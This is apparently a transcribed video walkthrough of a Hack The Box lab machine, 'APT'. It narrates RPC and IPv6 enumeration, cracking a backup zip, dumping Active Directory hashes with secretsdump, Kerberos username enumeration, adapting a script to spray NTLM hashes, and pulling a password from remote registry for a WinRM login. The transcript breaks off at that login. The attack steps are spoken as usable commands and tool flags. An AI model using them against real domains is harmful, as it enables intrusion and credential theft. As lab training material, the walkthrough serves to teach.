 what's going on youtube this is ipsec i'm doing apt from hack the box which was an insanely tough machine but there are a lot of learning opportunities when it comes to like rpc enumeration remote registry ipv6 and the potato exploits essentially with this box you use rpc to enumerate the ipv6 address of apd as an unprivileged user with that ipv6 address you can bypass the firewall and access smb to download a backup of active directory you grab a bunch of hashes out of active directory spread against the domain and you find that one works but you don't have any remote access use remote registry to pull some registry keys and find that some software put a password in the registry use that password to get low priv shell on the box and then you notice that net ntlm v1 is enabled which is a completely crackable hashing format so you use the potato exploit or windows defender to make a smb request back to your box and get a net ntlm request that you can then crack to get the um administrative user's password um that all being said a lot of the criticism around the box was there was just a lot of not fun enumeration for example finding that ipv6 address there's no real indication that you have to use ipv6 not on the web server that it's host and also the firewall is configured to drop all packets and i think if you just did the firewall to reject packets on like port four four five three three eight nine fifty nine eighty five then and map would show those ports are filtered telling you there's a firewall in play something like that would be nice also when it comes to the password spraying it didn't really fit the story which we'll get into a little bit later but let's just jump into this box as always we're going to begin with the nmap so sudo and map dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it apd and then the ip address which is 10 10 10 213. this can take some time to run so i've already ran it looking at the results we have just two ports open the first one is http on port 80 and it tells us it's a windows box running iis version 10 and then we also have msrpc on port 135 and map does tell us it is windows as with this little um service info thing along with this iis but if we wanted to triple check it we could just send a ping to this box so if we ping 10 10 10 to 13 we do get the ttl of 127 and windows default ttl is 128 there's one router between us and hack the box because the vpn which decrements the ttl by one hence 127. generally if the ttl is below 64 i think it's a linux box if it's below 128 i think it's windows if it's above 128 then it's probably gonna be like a networking device like cisco or palo or something like that so that's generally my rule of thumb with ttls before we go on let's just record what we did with this nmap so i'm going to copy this and then we're going to go over to obsidian and we're going to take a note so o5 enumeration call it nmap and then we're going to do triple tick and i know i've said this a few times one day i'll learn how to um put the nmap flag on this markdown so when we click preview it looks even prettier than this um we could switch it over to sql which kind of is a bit better but not by much if we look at sql we can look at that i think these colors change to be teal instead of i don't know what it was before but yeah just always good to record the nmap so let's go on and i guess start with the web server so going to 10 10 10 to 13 we get a page that says gigantic hosting the very first thing i do is i generally will look at is this index.html since it's a windows box i would probably try like asp and aspx we can also try php to see if it's a php web server but being iis chances are it's not php even like the windows php things i generally come across it's using x amp or xampp however you say it which will run apache on windows so it is a html page so we don't know exactly what language is behind this it does hint at it being a static page and i'm now just scrolling this web page looking for like user input fields along with like usernames emails things like that so looks like all just lorem ipsum comments like this is not a language uh maybe it is many desktop publishing the standard chunk it was popularized it's like meme language or something and then this one i guess at four they just gave up the wise man i don't know but this page doesn't exactly make sense so i'm not spending too much time on it and i realize i just went to the same thing multiple times by going to the same page we look at our clients i don't see any client names switching over i don't see too much uh looking at this gallery we could try to like save this image and if we save it this is p10 i would just make sure i didn't have anything sensitive in the downloads directory looks fine and we could move downloads uh what was it saved as p10.jpg we can do like exif tool against this to see if there's any like metadata that would say anything doesn't look like there is so i'm not going to look at the metadata of all these pictures sometimes there may be like geolocation they could be a comment tags things like that that you come across but nothing here so again we're just trying to figure out where to attack this web page going over to the support we do have a email so gigantic hosting so i'm going to go back here and we're going to create oh credentials or maybe i'm just going to call this accounts i don't know a good one to call this but generally the very first note i do is like sensitive things and i always deem accounts as sensitive so we have email and let's do this as a table so um yeah we'll just do like this um that's funny it's mailing to demolink.org so um we can do test test gmail.com and uh please subscribe to ipsac and instead of sending it to burp suite um i noticed my foxy proxy is there i don't have burp suite running right now but when i'm doing things just testing websites at first glance i won't always go into burp suite because i don't run burp suite on my host because i don't like putting that port swigger um ssl cert on my main web browser so if i was just testing a page at first glance i just open up these dev tools and then when i click submit we can see what it's doing and if we look at this we can see uh it's not going anywhere uh the page is still going um my vpn am i still connected we can ping 10 10 10 uh 213. i am still connected uh let's see is there like a edit resend yet there is so you can see what things we sent but it is just a post and see that is nothing in the body so we just made a post request and it timed out because it switched to https and i'm not even going to bother putting it as http because there's nothing in this body so this was just a big waste of time we could look at the source code to this and see what's there and at the very top i see this mirrored um 10 13 38 16 support.html by something so this looks like it's just a mirrored page and there's not much information there so what i'm going to do is hit print screen this is going to open up my flame shot and i'm just going to screenshot this and we're going to put a box around this ctrl c to copy and then we're going to go to obsidian and create a quick note 10 web page and we'll say gigantic hosting pages cloned and we press that for paste it image and that's what we have and i'm going to say nothing too interesting here um no user input except contact form which doesn't send data and goes to https which is not listening there we go and i guess uh i'm not going to bother screenshoting this and saving it we just have a note of this page so nothing too interesting i guess we could screenshot this page just so we know what it looks like in the future and if we wanted to talk about it we can um just paste that there there we go so let's move on um we should have probably created a folder called apt and then moved all this stuff in there to be organized so let's see what do we have else um we can go back to our nmap so if we go nmap apt there was a second port this is this msrpc thing and generally like probably 99 times out of 100 or 999 times over a thousand i just ignore this because like my history with msrpc every time i dig into it there's just too much information so like if we did uh pseudo msfdb run to start metasploit and we try to use like metasploit scanner for this um i just don't even know where to begin with parsing this information so um let this run come on metasploit start let's do search uh dce or pc oh my there's a few uh we can use endpoint mapper so use to set our host to 10 10 10 213 and we run this and it's going to connect to it and give us way too much information like information overload maybe so there we go it ran and we just have all this information i don't know where to begin with this and then there's also some cool things like you got this event log here i think elsas is somewhere like it's got a lot of catchy things but i just yeah pipe lsas right here but i don't know where to begin with this output and what else to do uh we could also like look at um let's see this i guess we'll do three so use three uh we can set our host again i think i do g set to globally set it um maybe set dash g so i think that just made it so this r host if i switch scripts will stay the same dash d i think is global but we can run this and it's going to do pretty much the same thing as the other one did i think and just give us way too much info um i haven't actually ran this one yet so i don't know but this is kind of why i strayed away from our pc for the longest time and even after doing this box the rpc thing doesn't really get us that much information it's just something that is really cool and used with other exploits um like um smb relays and things like that that we'll get into but yeah nothing so what we're going to look at is um in packet so there is an impact script rpcmap.pi and if we do a which you can see oh it's in user local bin uh locate rpcmap.pi grep example because that's where all in packet scripts live is within some example directory so we have our pc map as part of impact so if we just run this so rpcmap.pi and then we specify we want to connect to this is going to be weird um this is like an old interface we have to ncacnip tcp to tell it we want to connect to a tcp ip thing and 10 10 10 to 13. if this really confuses you don't worry it confuses me as well so i'm going to copy this and we're going to go over to firefox and google it and if we go over to this microsoft document i think you can see various other things like we have uh i don't like this let's see do we have a different one if we go into this yeah so you have ncan iptcp nb ipx like netbios ipx and ipx is just like an old protocol i remember like this is like my first intro into computers back in like the late 90s because i remember blizzard games like i want to say diablo and starcraft maybe warcraft as well didn't support tcp ip in the early days it supported ipx and windows 95 or 98 whatever i used at the time didn't install ipx by default so you install that driver if you want to have a lan party and players people on a lan and understanding how that worked before like google and search engines was i guess tougher than normal but it's really just right clicking on your network connection and like selecting add ipx but yeah that was one of my first introductions to like computers or windows so giving you an idea how old this protocol is so that's why you specify and can iptcp because that's just what you do so we need to specify this with rpc map it's going to connect and give us a bunch of things um we can see like dcom right here and unique identifiers to dcom so if we wanted to interact with this service directly we could and we could also just be lazy and do a brute force with it so what we want to do is dash h to look at help there we go so we want to do brute uuid brute opnoms and i want to say we want to do off level 1 and for the sake of complexity i'm going to set opnom max to b5 so we don't spend too much time doing this and we also have to make all the commands typo free so operational like each one of these rpcs has a total number of operations and i did op num like limit five because what i'm interested in is only five but if i didn't know i was looking for that i probably said to like 10 15 or even 100 but we're just gonna go through this and look at what is successful and if you're confused you can always google these eoids to see what they go to and i like misclicked a bunch of times but i'm gonna let this run and we're gonna see if it comes back with anything and there we go we have a success right here we got two operation nums from this and then this one has three that succeeded so while this goes come on i can click this we can copy we can go back to microsoft's website most likely uh let's see this is a black cat talk that's probably good but this is the assignments so we can see what this is we can see this is part of the i object exporter and if we click on this we can see what each op num is so i'm just going to type success here so we know like it's highlighted we're looking at this one so we've got op num 3 and 5 which is success so 0 resolve oxide not um well this is interesting because this is what like potatoes use a rogue potato use an oxide resolver uh simple ping is that what exceeded no we have three and five complex so we can do server or live and we can do server alive too and with server live 2 um it returns strings and security bindings for the object resolver so this could be interesting um we're going to get into this one in a little bit i just want to look at the next one whatever this is so if we google this uid uh we could go to this black cat talk is this also on this page it is not on this page if i get rid of some of these unique identifiers is it anywhere it is not if we go here paste this it is part of um rmi maybe uh we got his server listening and that but we had like five options here and this is only showing zero and two so let's go this and we'll say site is equal to this so site that we don't want https a little bit of google docking and this uid doesn't go on microsoft site at all so i'm going to put that on the back burner when i don't see like microsoft documentation for something i'm looking at microsoft related i'm just like you know what let's just move on so we could look at this dll i guess and i'm going in uncharted territories here i didn't even look at this but it looks like it is part of microsoft so microsoft thing but there's no documentation on it this is a microsoft thing with documentation so that's why i start with this so if we google this uid thing uh we know we have some like uh things these are problems we don't know how to interact with them and if we look at this we have the oxid resolver part one and we got this big blog post that talks a lot about this on how to interact with them and then they also give a great impact script which unfortunately is python 2. however super easy to port to python 3 just change the print statements i hope so i'm going to vi um what do we want to call this i'm going to call it iot resolver.pi and then we'll copy this again tell vi to set mode paste so set paste paste in and then let's look for prints and convert it to be uh colons so this works with python3 so we just do target is dash t like this there we go all but one print so let's get this last print so let's see if this works python three iota resolver dash t 10 10 10 213 uh 47 bam probably just did not copy the last parenthesis so now we have interesting things we have ipv6 interfaces if we go back to the microsoft documents it kind of makes sense why it says the security bindings for the object resolver which is probably ip addresses so we've got the host name ipv4 and ipv6 if we look at ipv6 so uh pseudo vi etsy hosts and we go here and say apt and we can do nmap dash six uh we wanna do sudo and i'm just gonna say apt because that's only got an ipv6 interface uh we can do dash dash min rate is equal to 10 000. and this will go like instantly and we can see a bunch of ports open so we know we have something here now what i'm going to do is i'm going to get this min rate off and we're just going to do nmap dash v uh actually uh we'll do dash sc sv for numerate versions o a and map ipv6 and while that goes um we can cat iot resolver pipe it over x-clip selection clipboard and then we can say new page ip or 15-ipv6 and we can say ibv6 getting hostname python paste and then source link this blog okay so now when we look at this getting her name and we have the source of where we got that script from if you're confused why do like skip by five and that's if i want to go back and put something between these i can easily do that whenever i number something for like being the sake of ordering it's just a habit i have uh nmap is still running this can take a while and i wanted to show some enumerating the firewall but um i didn't want to do that while nmap was because it was running so we're going to take a look at those results in a second but before i do that we want to open up wireshark and generally what i'll do to enumerate a firewall to see if they screwed up the rules is we can do a net cat so we can do nc at 10 10 10 213 let's specify port 445. because this is a windows box and 135 is listening i know this board is listening so we can run this and we look and we just get this ip retransmission thing so nothing so next thing i want to do is check a port i don't think is listening so um i'm going to do 2 4 3 two four and we're gonna see if it behaves differently and it does not so there's no real way to enumerate this firewall because what it's doing for unknown things is the same it's doing for known things every now and then especially on linux you'll come across something where if they block the services like explicitly they'll send you a reject instead of just dropping the packet which this is doing and when you see the reject on like port 445 and a drop packing on everything else you know 445 may be listening and you got blocked but because both of here are responding the same there's nothing you can really do so with all that being said let's get into the ipv6 and map so let's look at nmap slash apt or we'll look at ipv6 dot nmap i guess i should label that like apt-ipv6 but we can see it's got 53 simple dns plus we got iis we got 88 kerberos so i'm thinking after 33.89 this is going to be an active directory server because we got like dns kerberos and ldap probably secure old app yup right here so we know this is a d also has hdb.local so we know the domain name we got some time stuff with these not valid before after the clock and smb stuff message signing so a lot of good information in this so i'm going to cap this x-clip selection clipboard and we're going to go back here and say enumeration and i'm going to go back into my edit mode and say ipv4 and then we'll do [Music] ipv6 and we can also link details on getting uh ipv6 name 15-ipv6 i think that's how i do it no that is not how um bam uh you think i need two brackets that's where i screwed up there we go so now we got that and also if you went into this open graph view you can see enumeration is now linked to ipv6 if you're like looking for notes a little bit helpful not too much but just a cool thing this application does um and if you like have watched my videos a lot you'll know and sneaky i do a lot of like ipv6 multicast things to discover addresses it's actually not applicable here because windows does not um respond to the multicast by default so if you tried to do like logged into a box on the hack the box network and did like a ping six uh dash i your address like dead beef something whatever your ipv6 address is ipa ddr so if you did like ping six dash i this ff021 i think would do a broadcast it won't actually work because windows doesn't respond to broadcast things also in sneaky i say that windows would work if you send it a invalid ipr i uh an invalid icmp packet and that doesn't work as well because microsoft fixed that what used to happen a few years ago you just sent a broadcast packet out that had a bad checksum in it and then the windows box would get this broadcast palette kit and go back to like hey um i normally don't respond to these but you made a mistake but microsoft fixed that um curiously like oddly enough i think netbsd is still one of the only operating systems that responds to batted broadcast packets so no good way to enumerate ipv6 without just like doing a nmap against the v6 address space which would take forever so let's have a question this oxygen resolver stuff is pretty much the only way so what we can do now with this ipv6 stuff is we can try doing it in like um smb client i guess to access um the smb share so if we do smb client slash slash apt slash uh let's see dash l we need so dash l is list and we go to there is this backup directory so if we try to use backup so we do snb client slash apt backup and enter we get anonymous login successful and we can download backup.zip i was really get backup.zip it is download i was actually not expecting that to work i thought we'd have to specify the dash n for null authentication but doesn't look like we do we just log in and what i was doing for the password there was just blank so it looked like it did an anonymous login when i don't specify a password so we have this backup.zip i'm gonna unzip it so unzip backup.zip and it requires a password so that's unfortunate for us um i think there's like zip to john there is so we can do zip to john active directory uh no we just want backup there we go and we get this so we can say v um backup dot zip dot hash maybe i don't know what to call this but we just paste that there and now we can do john dash dash word list is equal to uh user share word list rockyou.txt is that it ls that is a file and we can say backup.zip.hash and normally i'd be going back to my kraken but i haven't bothered fixing that since i moved and holy cow that cracked almost instantly we can see the password is i love you so much so let's do unzip backup.zip paste this and we have our backup um i'm going to makeder backup and we're going to move the two files that it created active directory and registry inside of our directory called backup so we go into backup and we got these so we can do find type f and what do we have maybe general file management i don't know what jfm stands for uh we don't need to use this nah it's peak my curiosity uh file we put this in quotes because it has a space in it it's just data probably jfm like probably something with journal let's see extension jfm let's see jfm what are you it just keeps saying jfm don't know we don't need the smile um what if i xxd it i know i keep saying let's move on but i'm interested there's not much information in it yeah so there's not really anything in this file so what we probably should have done so if we go back smb client we can copy this and go back to our notes 20 ntds backup there we go so just we have notes and uh [Music] where's john can show that as well there we go so again always take notes as you go it comes in super handy what is that find command find there we go so we can do secret stump this is another impacted script so secret stump i think dash ntds ntds.dit and then security registry you know what let's move active directory here move registry here so we don't specify these stupid directories i really hate oh wait it's got auto complete saved me there by escaping that space but this is how i like it so we can do secret stump dot pi dash h and we can see some things um i really like having this password last set this user status and history flag so uh password last set is going to tell us what day the password was set i just like having that information it's really handy if like you come across a domain where they have a user account a datum account like there's multiple levels for the same person and you see them setting the password within one hour chances are those are the same passwords because they change it on one and then change it on all accounts the user status is going to tell us if the account is disabled or not just good information to have and then the history this is a really cool thing because by default windows i think remembers the last 24 passwords so you can't like reuse a password that you've used before in order to do that is to store the password so this history flag is going to dump the history for every user so if they change the password 24 times you get 24 passwords for them so you get the previous password too really comes in handy with password sprays so we're going to do uh secretsdump.pi pwd last set user status history and then i think we'd specify like ntds sam and security so dash ntds is gonna be nts.dit dash security there's gonna be security and dash system system okay and if you don't know oh uh target i think we just do local there we go so while that works if you don't know what these files are ntds.dit is the active directory like database security i think this is where the encryption like a key used to decrypt ntds.dip but that key is obfuscated by the boot key which exists in the system so ntdsa is the database i think it's encrypted by key and security and that key and security is itself encrypted by a key and system and this is just registry hives and windows so yeah we are dumping a lot of data so i'm going to control c this actually and we're going to t this file off into a different one i'm going gonna call this secrets dump dot backup there we go because that was that was like information overload uh the default password for i think like this is the recovery key for active directory password one two three bang we get some deep happy stuff which is good but yeah let's just let this go it's gonna take a while probably so that didn't take as long as i expected it to i'm going to grab this and we're just going to i'll put it here dumping ntds i need to put this on a new line there we go so we got a lot of information here if we cat secret stump dot backup um generally how i push through this is i just do grep dash v's and we can grab dash v aes and say 102 and v is going to say exclude and we can also say ds.cbc and the reason why is i like seeing these aads to see if there's any landman hashes um i think for this to be shown windows would have to have that checkbox and the user to say store password and reversible encryption but it looks like everything's gonna have aad which is the blank lan man so it's disabled so if you only wanted to see ntlms you can just grab this blank one and grab it on the backup file so we can also grip for history and then grip-v history zero and the apt main key so this is like the hostname of the machine what you can use to do past the hashes has rotated uh three times because oh wait what it didn't start at history zero that oh because i hid zero so um you got the password so that'd be the first one history zero which is the second the first so third fourth so the domain key for this box has been rotated four times but no users have been rotated more than once interesting enough like every user has had a password and then they change the password so i'm not exactly sure what that is about if we look at secret stuff and look at these password last sets we can see they're all set at like the same time 1837 like same time everywhere um maybe someone can be 36 if it took a while for this script to run but you can see something yeah 18 36 and 18 uh let's see so i saw at 36 but you can see everything set around the same time so what i'm also going to do is we're going to try grep v 18 3 and 6 7 and we want to get rid of history zero [Music] we got five as well so i'm just looking for like an account that was set oddly uh kfbtgt not there um i was saying this hashtag hasn't changed five times i think um this is a local like the the main controller itself sash it's not the um active directory domain hash which is kbt gt so this is you can still dc sync to this domain with this hash if it was still valid um hopefully that makes sense uh we get the administrator he was set on 1253 so he wasn't included in all of this but yeah we also have status as equal to enabled we could also um see if there's any disabled account so if we grab status and then grep v enabled uh there's only two accounts that is disabled kbgt which is always disabled because it's not really an account it's just a signing key and then default account is disabled so nothing interesting there so we just have a list of accounts and what we guess we can do is see if these accounts are valid on the domain itself and we can use a tool called curbroot to do that so in order to do that we just have to grab a list of all accounts so i'm going to go again grab a d3b and then we're going to do a awk-f on colon a field separator or delimiter whatever it is i'm going to say grab the very first instance so now we just have user names i'm going to grab v history because we don't want that pipe it over to sort dash u so we have only uniques and we can say users.list so now we just have a list of usernames and we can find out which ones are valid by using a tool called curbroot so if we just go to google go to curb route this will do a cobras pre-authentication check to see if users are valid you can also do password sprays with it which is super handy um because well it will still lock out users it doesn't create the traditional event code of 4625 instead it creates another one that isn't logged by default so it's a pretty good way to like do log evasion with password spraying if you don't have this tool you can just download it on the releases but if you do like i do i just have it installed in optical route so we go opc cobra h for options we probably want to do user enum so we do that with h and then pass what flags we want so we can do dash dash dc and that is going to be apt and then the domain which i think secrets dump said hdb.local but we can probably figure this out i'm pretty sure i said it before do i have it in my notes is anything here um ipv6 oh the nmap will probably say so if we go to enumeration we do have the domain right here http.local so that's why it helps taking these notes so nmap has told us the domain is hdb.local so dc is apt this is in my etsy host file as the ipv6 address dash d for domain we're going to say apt.local and then users.list um i didn't specify user enum i said it did not specify it and how many users are there so if we cat users.list oh wrong realm that's that's not good oh i s hdb.local there we go well now you know what will happen if you specify the wrong domain in curbrout at least i assume this won't error now um so we're in backup and we found a valid username administrator so if we want to grab hashes we can now just like grab administrator from what's the file name we called it secretsdump.backup so we got this password hash the password was last set 2020 september 22nd so what if we try logging in with this password i'm going to go into crack map exec and poetry run cme and then smb apt let's see if we can connect to it and it doesn't look like we can um i think this is probably because of ipv6 crackmap exec may not support it so what i'm going to do is listen on 445 on my localhost and direct it out to ipv6 so sudo socat tcp listen 445 and fork so every connection just forks and we can go move on with a life if we don't have that fork then it's going to create like a blocking network connection if multiple things try to connect to it it will won't work until the previous connection stops so fork is always good when you do listen with socap tcp apt and again if we this is getting crazy with my windows but if i ping apt it's going to that deadbeef ipv6 address so 445 so now when i do this poetry run crack map exec and i'll specify instead of apt we'll do localhost and see if it connects it does awesome i wonder if we can do like dash dash passport for password policy see if that is enumeratable with anonymous doesn't look like it is so we can do dash u administrator dash capital h for hash and grab this administrator's hash so if we grab this right here copy paste we can see if we can log in with administrator which we can't so now we're going in and just waiting for um this to finish and if we look um let's see right here this one is in http backup if we cat users.list wc-l we're trying 2 000 different users so this may take a little bit so i'm just going to pause the video and we'll resume when this command finishes curb route has finished it took around 17 minutes to run but after seven minutes we got the account of henry vinson we also have the machine account of apt and if you remember from like zero login attacks if we have this machine account hash we should be able to dc sync so that's the next thing we're going to try so let's go back up to a poetry command and i'm actually not sure if crack map exec can test machine accounts but we're going to try it anyways so apt and then we'll do the hash of that account so if we grab probably apt on this um let's see we can get this hash so let's grab this copy paste and see if we get a success here we get login failure so let's go to the next one of henry vinson so let's grab for henry and his hash is this 2d so copy and then username henry.vinson and then the hash paste that in and we get login failure we can also try his old password but that wouldn't really make sense coming out of the backup we can also maybe grab for vinson on secretsdump.backup and we can see he has uh no why men i don't even know what that is sometimes things don't make sense when you look at them especially when it comes to companies maybe i guess we can try this hash so if we search for this hash and we'll see what happens because it had vincent in the name so maybe it's the same person and he has a password reuse scenario going on we can try the hash and will it work no so we could spray all these hashes and that's what we're going to do we're going to take every single hash in the secret stump and spray it against this guy's account doesn't make much sense i think it should have been like an adm account or something like that but what they're trying to show is every now and then organizations have like i think it's whale to man like it blocks smb brute forcing um and if we sprayed with crack map exec we'd run into that issue because after a few failed attempts it's going to block us it's essentially like fail to ban but for smb so what we have to do is use a kerberos login now the issue with this is curb route right now does not support it um it will probably be around like around the time this video is posted and if he pushes this branch before it's posted then i'll try to edit the video and add in a piece at the end going into this but yeah the commit feature request is here for that and right now curb route just doesn't have a way to authenticate via ntlm hashes but this application does it's called pi curb route and it's just a janky solution because mainly it's python 2 and it just isn't a typical project it just screams like this is a researcher's project with just how it's organized so i'm going to go into my htb directory apt i'm going to git clone this project pi curb route we can take a look at how it works so if we look at ad password spray we can see it's importing a bunch of stuff i think this is from mpac uh maybe this isn't from a packet but all the libraries are contained so it's got this underscore crypto that has things it's got pi asm1 that has things so it should work rc4 hmac is e type 23 so they just have that coded right there so let's see and if you didn't know um this is like ntlm when you see rc4-hmac uh that's an ntlm and ntlm is just a md4sum that is utf 16 bit little ndn encoded so if you wonder why ntlm cracks so fast it's because it's not even md5 which is still a super fast algorithm so if we look at this how it's used we got arguments and it's doing some things if arg4 is clear password and this is like what i mean about it being a little bit janky if i was making this i'd probably use argh parse so you don't have to do everything based upon where it exists in ergb but that being said this is a great program because i couldn't find a better way to do this so whenever you do these like weird 1k scenarios that aren't really too common um janky solutions are probably going to be what you find so if we look at how it works it does a password spray tcp on these arguments and it's doing line strip rn so i'm going to take that password spray function and i'm just going to move it up so if we go here i think if i just do like d i can delete everything boom i can awesome so it looks like four spaces and we just want to hard code a bunch of things so the first one is user realm and that is going to be the domain name so hdb.local and then we have this which is the password so we'll get to that in a little bit um we want to do user key so user underscore oh wait no this is the username uh user key is the password so we can do username is equal to henry.vincent and we're going to put that here so henry.vincent and then user key will get rid of because that is password or ntlm i should say um kdc a this is going to be the hearst name of the machine which is apt and then the very last thing um wait what is passive spray tcp maybe that is the password if we look at this password spray how is it using the thing so user key i wanted this is going to be the encryption type uh realm name key let's just go to this build as request function to see exactly how this key is used so if we look at key it is being used in this pa time stamp probably yeah encrypted time stamp out what is encrypted timestamp used this key 0 e type so that's the encryption type so this is multiple things encryption type and then key maybe the easier way to go about this is just to look at the code and see how it uses or how it builds this user key so if we go here and then search for what was it user-key user underscore key oh come on where's the build tcp um check user i'm in enum i want password spray there we go that's why it wasn't making much sense to me so if we look password spray tcp user key so we can search for that go up to see where it's used so user key e type rc4hmac that is what e type 23 i think we said earlier and then the decoded value of hex so now we kind of understand how that's played so let's go back to our password spray and we're going to say um with open hashes.txt read as f then we'll say hashes is equal to f dot read lines print hashes let's just see if that works uh shoot um python two versus three this is python two so we'll do print space i feel so dirty for using that um let's see python 2 80 pwd spray and i feel so dirty i typed it out of habit hash is not text so test hash okay so we probably need to remove backslash backslash n maybe so v80 password spray um hash is this so for hash and hashes oh h i said ooh because that like went into keel color which means this may be used in python so that's why i just say h and then say h is equal to h dot strip backslash backslash n and say nplm bam that's easily readable and now if we print ntlm we can see how much i want to put those parentheses on um h is not defined because we changed it so ntlm there we go so now if we had a list of ntlms that works so for this password spray we can make user key now so user key so user underscore key is equal to rc4 underscore hmac and then we can say ntlm dot code x and that code very similar to this right sister arg5 is just ntlm in our case and they're putting that argument here they're stripping this backslash or backslash n we already did that so that's why we don't have that and then we just need the last piece which is going to be password so if we space space space put a bunch of spaces let's see this can be let's move nt on like that there we go this is user key and then this is ntlm i think we're about to find out if this works um i wouldn't be surprised if it doesn't like whenever your code works for the very first time that's when you have like things to be worried about um let's see we want to grab for awk and let's see we need create hashes.txt and i'm going to guess it's the fourth parameter let's cat hashes.txt oh man i'm good if we look at that secrets dump file let's go to aad where an ntlm is so we got username then uid and land manhash than ntlm so i field separated on colons and one two three four so now we've got hashes so cp hashes.txt and we'll copy it to hdb apt pi curve root python 280 password spray what error message are you going to display henry is not defined um henry.vincent needs to be in quotes and service not known socket so i'm guessing this is going to be a ipv6 thing so if we look at socket we're using socket it's using afinet and we want afi net 6. so percent s af underscore inet af inet 6 replaced it in i think just two instances i thought it was gonna say down there but i don't see how many times it replaced it i knot yeah just two i may have said it over on this right side which i wasn't looking at but now let's try it again password spray is it going to work well this can take some time um i'm going to pause the video and we'll probably resume let's say um curb route took 17 minutes this is in python not uh go i'm gonna guess it can take 20 minutes but we'll see so after quite a few minutes um the script aired out i'm hoping this just aired out on a successful password but i tested this against a um active directory setup i just have at home and the script works so um i think kerberos just decided to tell us no and then the script just pieced out because we don't have any error handling so what i'm going to do is add a little bit of error handling so if something does go bad it can just um like fail let us know and continue because what happened was gabriel said no and then the script died and we don't even know where it left off so what i'm going to do is put a try and then we're going to indent this and then we'll say accept exception as error and then i want to print a few things um i'm resisting the urge not to do a parenthesis but we want to print uh let's see ntlm plus actually we'll do two print statements ntlm and then str error and i don't know if this is gonna work um we may just want error but i know in python 3 we always want to do string error because i'm not i'm trying to think how air is handled uh python 3 everything's kind of like a byte so if error is a byte that's why i'm doing string but it's python 2. it's not like that however if i do string against a string i think it works anyways so um this is one of those um my code is bad but please don't judge me moments so we're gonna run this password spray again and just see what happens the script finished but it didn't finish in a way i expected it to uh it took 17 minutes if you're watching the time in my top right i just had things come up while this was running and came back to it when i could but 17 minutes after it actually finished so it's about the same speed as the go program that being said um it just displayed the hash and a failure which i don't understand because what i did was uh i created this hash.old thing so let's go v h dot old here and we're gonna put a few hashes so one's gonna be valid so we have this one as that there we go so that middle one was the valid hash right i'm going to edit this program the ad password spray and it's going to um just work successfully and not hit this error so h.old we replace the text and watch the demo god's going to have me and it's going to error again uh python 2 there we go valid login like all i edited was this h.old file not exactly sure what went on there maybe there's like um a different line break between the two of these but i don't think that's the case let's do xxd or head dash three hashes xxd let's see this one begins with zero a so this is using zero a for line breaks and this is using zero a for line breaks so the line break between hash is the same i i really can't explain it but thankfully i had the hindsight to put this hash in the exception and that's one of the things that i guess just comes from experience like whenever you're doing error handling even if it doesn't make sense you're like you know what let's see exactly where my program this aired or where in this word listed errored so we get that hash let's test out to see if it's valid so i'm going to go back to my crack map exec and we're going to do poetry run henry vinson and this hash and the pi curve route did tell us it was valid so this should definitely work but we don't see pwned so we can't use this smb to really do anything we could look at the shares to see if henry vincent has any extra access we can also do winrm to see if he has win rm access um maybe i'm not sure why that didn't work um we could just do evil win rm dash i a p d dash u henry.vincent h for hash i think h is hash dash capital h for hash and see if it connects with when rm i'm not sure if like my serocat ford is oh that is why if we change socat ford to be 5985 it'll probably work that is why it just did that well it won't work in the sense that i know this user doesn't have access but crack map exec will hopefully display something there we go so now we get that access denied which is what i was expecting so now what we have is just this user um i guess we can try smb client dot pi this should support pass the hash to log into the share um help x is not i don't know what's going on with my smb client let's see smb map will this work okay dash u henry.vincent-p we gotta put that hash twice or we can put a landman hash than ntlm uh let's see where is the hash it's in this pane that's why it's always important to know multiple tools okay h for host localhost um what oh i think lowercase h for password no password it should detect hash henry.vincent wonder if there's a domain hdb.local probably shouldn't matter because this is a domain controller let's try putting that aad3b but i think something is going wonky with my impact library that's breaking this so hopefully that doesn't cause me more issues later on let's see p if we say host is apt this is probably because of ipv6 so not exactly sure what this error message is so we're just failing all around um there is a another thing we can do and that is remote registry access which is somewhat common but generally doesn't reveal too much useful info kind of just like the enumering rpc to get ip addresses or ipv6 addresses it's not normally something that is too useful but it is common to find and the reason why remote registry is common is because nessus kind of requires you to enable remote registry to do a lot of checks or at least it used to so you will find this remote registry setting being enabled despite a lot of like hardening policies saying it should be disabled so let's do reg.pi dash hashes and we'll say that and we have to grab our um hash for the user so there we go and then the user is going to be hb dot hb.local henry.vinson at localhost and then query the registry so dash dash or i think it's just dash keyname and hk u for h key users so let's see what this does uh connection refused see henry vinson localhost let's try at apt uh status pipe not available it's gonna work i don't know why it failed the first time but it's not a super reliable one and you maybe will get hkey local machine the reason why it's not cu because there's no like login session yet so we just go to hkey users to see what's in that registry key so we can look at these environments um out of these the software is probably the one that would be much most interesting because every now and then software will store its um secrets inside the registry i think like putty stores encrypted username and passwords in the registry and things like that so looking at software we can see in the hkey user software there is this gigantic hosting management system key so when we look at it we will um make a typo probably so let's just use a good old copy and paste so we don't make typos it looks like i forgot a letter there but we do have a username and password and it's been a while since we've started taking notes this username password kind of reminded me and it's one of those good things about like taking notes is every now and then you'll just go like on a roll and be like oh i probably should save this information and then you just go back and save a bunch more so henry vinson and we want to save this and for this i definitely want to put this in a table so we'll do um type user password notes i think this is what i did in another video and then type when user this password is that and the note for this will be the registry key so we can save this so when it comes time for writing the report if we are we will know exactly where this password was found it doesn't really do them any good if you say hey you should change this password and then they change it and they update the software and it goes back in the registry because the finding's still there so always good to have some type of note so we have that and then we also have um henry vinson so we can add him there so this will be gwen henry vinson um you can just grab the hash and then the note for this will be password reuse old ndds.dit there we go or instead we can link 20 ntds backup there we go so we can do a new note say 25 remote registry and then paste your commands real quick we want to grab this and we can say list keys it's probably bad terminology but that's what like after you do the box and proofread uh that's when you fix it so now we have notes properly done for where we are and that took what like three minutes to do to stay on top of this note so definitely something you should be doing as you work and we can now do this poetry run yet again and this will be henry vinson let's go over to our accounts and it's underscore adm and this password so underscore adm and then dash p for password and we probably want to put that in quotes and just say that you may not have to but i see this hashtag which is a special character so that's why i put it in quotes um 1rm bad response 400 let's try smb to see if it's valid so we look at this it is a valid account and i wonder if we're just not forwarding the right port if we need 59.86 so i'm going to try doing that as well and powershell remoting may also not like us bending the port it may have some type of like man the middle weirdness that it protects itself against so because we're doing this in like a unintended way because crack map exec does support ipv6 we shouldn't always take what it's saying as gospel because it is doing http so maybe in our http header it's saying host localhost which is why we're getting this error message so that is why i kind of go on to try a different tool so we're just gonna try yeah evil winner m so i was making sure i typed the username correctly so i apt dash u henry.vincent underscore adm dash p for the password and we will put it in our single quotes and see what happens we are establishing connection and we get on this is weird um i don't know why it's doing that but oxdf told me if i reinstall winrm it will 